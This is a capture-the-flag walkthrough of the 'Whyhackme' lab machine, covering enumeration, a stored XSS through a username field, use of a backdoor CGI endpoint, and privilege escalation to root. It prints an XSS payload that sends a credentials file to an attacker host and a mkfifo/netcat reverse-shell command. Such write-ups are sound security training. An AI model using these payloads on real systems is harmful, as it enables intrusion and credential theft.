# TItle: Whyhackme

**Difficulty**: Medium

**Category**: Red

## 1. Reconnaissance

I start by launching a simple nmap scan just to identify the open ports.

```bash
nmap target-ip
```

![alt text](photos/1nmap.png)


I ran another nmap scan but this time with -sV and -sC tag to check which versions of services are running and to determine whether the FTP service allows anonymous login.
```bash
nmap -sV -sC target-p
```
![alt text](photos/2nmap.png)
![alt text](photos/3nmap.png)

FTP indeed allows anonymous login, we also discovered there's an update.txt in their ftp server

![alt text](photos/ftp.png)

let us download it in case there might be something interesting inside.

```bash
wget ftp://anonymous:anonymous@target-ip/update.txt
```

The file mentions that an existing account 'mike' was removed and a directory dir/pass.txt exists where credentials are stored.

![alt text](photos/update.png)

## 2. Exploring the web 

When opening the website, we are then greeted with blog page and when exploring we discover that the website has a comment section but we are required to be logged in. This suggests that we might be able to execute some XSS attacks. Also it also mentioned that an admin user exists so we'll keep that in mind

![alt text](photos/web1.png)

![alt text](photos/login.png)

I also tried accessing the dir/pass.txt directory and as expected, we are prohibited to access it.

![alt text](photos/403.png)

I then opened to burpsuite to see if we can access it by changing our origin IP from 127.0.0.1.

![alt text](photos/4033.png)

No luck, tried a ton of headers like X-Remote-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, Client-IP: 127.0.0.1 nothing worked.

## 3. Enumerating

I ran fuzzing attacks against the website using gobuster to reveal hidden pages on the website.

```bash
gobuster dir -w wordlist.txt -u http://target-ip/ -x php
```

While scanning we were able to discover multiple interesting pages

![alt text](photos/fuzzing.png)

Some interesting pages

config.php
register.php
logout.php

By visiting config.php we are greeted with a blank page. But in register.php we are allowed to create an account in the website, maybe by creating an account we can then comment in the blog post.

## 4. Foothold

After logging in successfully and I am now allowed to leave a comment to the blog post, let us try commenting a basic XSS payload to check if the web is vulnerable to xss.

![alt text](photos/logged.png)

```bash
<script> alert(1)</script>
```

Unfortunately the website sanitizes the comment section. but it also shows that our username is also reflected in the html body. 

![alt text](photos/comment.png)
![alt text](photos/inspect.png)

Let us try using the XSS Payload as our username instead of commenting it, Maybe usernames are not sanitized.

Username is indeed not sanitized.
![alt text](photos/reflected.png)

## 5. Exploitation

To make it easy for ourselves, let look for an existing XSS payload that would help us fetch the contents of the dir/pass.txt

```bash
<script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://<ATTACKER_IP>:<ATTACKER_PORT>", {method: "POST", body:y}));</script>
```

Lets use this payload that I found on the internet, Just replace the Attacker IP to your tun0 IP and change the Attacker Port to the port you are listening to.

Start a Netcat listener to receive the incoming request.

```bash
nc -lnvp 9999
```

Now lets create another account using the payload as our username and leave a comment to execute the payload.

![alt text](photos/create.png)
![alt text](photos/leave.png)

After leaving the comment and refreshing the web. We were able to retrieve the contents of the pass.txt from our netcat, giving us a user and password which then we can use to SSH to the targets server.

![alt text](photos/pass.png)


## 6. Priviledge Escalation

We are now able to get into their server using jack's account.

![alt text](photos/ssh.png)

Let us first look for the user.txt flag using

```bash
find | grep user.txt
```

![alt text](photos/user.png)

Whats left is the root.txt which we are only able to access with root priviledge. I ran sudo -l to check available SUID the user jack can use.

After checking, we can run iptables as root. I've looked up in gtfobins if we can use any priviledge escalation techniques using iptables unfortunately there isnt.

![alt text](photos/suid.png)

While exploring the server I discovered 2 interesting files in opt. urgent.txt and a pcap file. Inside the urgent.txt it is mentioned that there has been a previous infiltration that occured. Suggesting that inside cgi-bin there might be a backdoor/rootkit stored in that directory.

![alt text](photos/urgent.png)

I tried accessing the cgi-bin and no luck, I also checked the permissions of the cgi-bin and it states that the directory is owned by the user "h4cked". Probably the reason why the admin could not delete it.

![alt text](photos/cgi.png)

Let's download the file using scp and open it with wireshark.

```bash
scp  jack@target-ip:/opt/capture.pcap /home/myname/Documents/ctf/Whyhackme
```

When inspecting the pcap file, Everything is incomprehensible since the traffic is encrypted. The only clue we have is that the attacker is attacking the server via port 41312.

![alt text](photos/port.png)

I went back to the machine and check what ports are currently open.

```bash
ss -tlnp
```

and surprisingly port 41312 is still running suggesting that a service is currently running

![alt text](photos/ss.png)

Since it was mentioned from urgent.txt that the they temporarily blocked the port using iptables. I first deleted the rule that prevents the port from running using iptables commands.

I then proceed to delete the rule that blocks the malicious port and add a new rule that opens it.
```bash
sudo iptables -L --line-numbers
```

```bash
sudo iptables -D INPUT 1
```

```bash
sudo iptables -A INPUT -p tcp --dport 41312 -j ACCEPT
```

![alt text](photos/iptable.png)

Once thats done. I ran an nmap scan on the malicious port to see what service is currently running.

```bash
nmap -sV -p 41312 (target-ip)
```
We discovered that an apache service is running in that port

![alt text](photos/apache.png)

When visiting the website, we are greeted with a 400 request and it suggested us to use HTTPS protocol instead of HTTP.

After changing to HTTPS we are then greeted with a 403 Forbidden request. We remembered during inspecting the pcap file, the traffic was encrypted with TLS suggesting that we should look for a cert key file to access the traffic and website.

![alt text](photos/http.png)
![alt text](photos/https.png)

Going back to the machine, when expecting the apache config file /etc/apache2/sites-available/000-default.conf
we are able to find out that the key for the encryption is located in /etc/apache2/certs/apache.key

![alt text](photos/keyloc.png)

We can then download the key to our machine using SCP so we can use it for wireshark and our browser.

```bash
scp jack@target-ip:/etc/apache2/certs/apache.key /home/myname/Documents/ctf/Whyhackme
```

Apply the key to wireshark to decrypt the traffic. 

```bash
Edit->Preferences->Protocols->TLS
```

![alt text](photos/apply.png)

After applying the key, we filter the traffic to isolate HTTP requests. This reveals that the attacker abuses a /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id endpoint, which allows arbitrary command execution.

![alt text](photos/tr.png)

Visiting the endpoint and inserting our own commands confirms that arbitrary command execution is indeed possible.

![alt text](photos/cmd.png)

To make it more convenient for us let use spawn a reverse shell with curl and netcat.

```bash
curl -k -s 'https://target-ip:target-port/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc (YourIP) (Port) >/tmp/f'
```

```bash
nc -lnvp 9999
```

We are then able to spawn are reverse shell

![alt text](photos/shell.png)

Since www-data already has root access.

![alt text](photos/-l.png)

We can now escalate our priviledge and get the root flag.

```bash
sudo su
```

![alt text](photos/rootflag.png)
